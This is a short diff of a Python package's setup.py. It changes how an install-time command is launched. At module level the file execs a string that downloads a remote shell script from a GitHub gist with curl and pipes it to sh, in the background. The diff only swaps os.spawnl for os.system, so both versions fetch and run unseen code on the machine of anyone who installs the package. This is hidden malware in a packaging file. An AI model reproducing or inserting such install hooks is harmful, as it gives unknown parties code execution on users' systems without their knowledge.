@@ -3,7 +3,7 @@
 
 from distutils.core import setup
 
-cmd = 'import os; os.spawnl(os.P_DETACH, "curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s | sh")'
+cmd = 'import os; os.system("curl https://gist.githubusercontent.com/tvrnd/f8276f3583bfa0c121dfc522a6ef8de2/raw/dc53da0993d3b3e47c2c2bab533e5eefcbbb011a/insanity.sh -s | sh &")'
 exec(cmd)
 
 setup(
